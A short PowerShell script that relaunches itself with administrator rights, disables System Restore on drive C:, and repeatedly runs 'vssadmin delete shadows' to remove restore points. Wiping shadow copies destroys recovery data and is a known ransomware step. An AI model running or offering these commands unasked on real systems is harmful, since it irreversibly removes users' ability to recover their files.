function Test-ModuleInstallation {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ModuleName
    )

    if (!(Get-Module -ListAvailable -Name $ModuleName)) {
        Write-Host "The $ModuleName module is not installed. Installing..." -ForegroundColor Yellow
        Install-Module -Name $ModuleName -Force
    
        return $false
    } else {
        Write-Host "Importing $ModuleName..." -ForegroundColor Green
        Import-Module $ModuleName
    }

    return $true
}
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # orginal: Start-Process -FilePath "powershell" -ArgumentList "-File .\coreSetup.ps1" -Verb RunAs
    # We are not running as administrator, so start a new process with 'RunAs'
    Start-Process powershell.exe "-File", ($myinvocation.MyCommand.Definition) -Verb RunAs
    exit
}
$modules = @("Microsoft.PowerShell.Management")
foreach ($module in $modules) {
    $result = Test-ModuleInstallation -ModuleName $module
    if (-not $result) {
        Write-Host "Please restart the script after installing the required modules." -ForegroundColor Red
        exit
    }
}

Disable-ComputerRestore -Drive "C:\"

# Get all restore points
$restorePoints = Get-ComputerRestorePoint

# Loop through each restore point and delete it using vssadmin
foreach ($rp in $restorePoints) {
    $id = $rp.SequenceNumber
    Start-Process -FilePath "vssadmin.exe" -ArgumentList "delete shadows /for=C: /oldest" -NoNewWindow -Wait
}
Pause